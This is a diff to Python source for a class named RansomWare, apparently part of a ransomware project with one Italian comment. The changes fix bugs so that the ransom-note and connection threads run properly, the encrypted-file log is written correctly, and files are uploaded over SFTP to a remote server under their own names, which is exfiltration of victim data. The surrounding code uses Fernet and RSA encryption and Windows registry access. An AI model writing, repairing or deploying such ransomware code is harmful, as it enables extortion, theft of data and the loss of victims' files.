@@ -3,12 +3,10 @@ from cryptography.fernet import Fernet
 import os
 import ctypes
 import urllib.request
-import requests
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 from tkinter import *
 import winreg
-import subprocess
 import psutil
 from threading import Thread, Event
 from time import sleep
@@ -44,9 +42,9 @@ class RansomWare:
             paths = self.read_log()
             for path in paths:
             # Il canale aperto non è strettamente necessario per l'upload SFTP, quindi può essere omesso.
-                ftp_conn.put(path,remotepath='local_file')
+                ftp_conn.put(path,os.path.basename(path))
         except Exception as e:
-            return
+             return
         finally:
             ftp_conn.close()
             client.close()
@@ -96,7 +94,7 @@ class RansomWare:
             self.crypted_files.append(new_path)
             return new_path
         
-    def write_log(self, file_path):
+    def write_log(self):
         with open(self.log_path, 'w') as f:
             for file_path in self.crypted_files:
                 f.write(f"{file_path}\n")
@@ -219,8 +217,8 @@ def main():
     rw.encrypt_fernet_key()
     rw.set_high_priority()
 
-    t1 = Thread(target=rw.show_ransom_note())
-    t2 = Thread(target=rw.connection())
+    t1 = Thread(target=rw.show_ransom_note)
+    t2 = Thread(target=rw.connection)
     t1.start()
     t2.start()
 
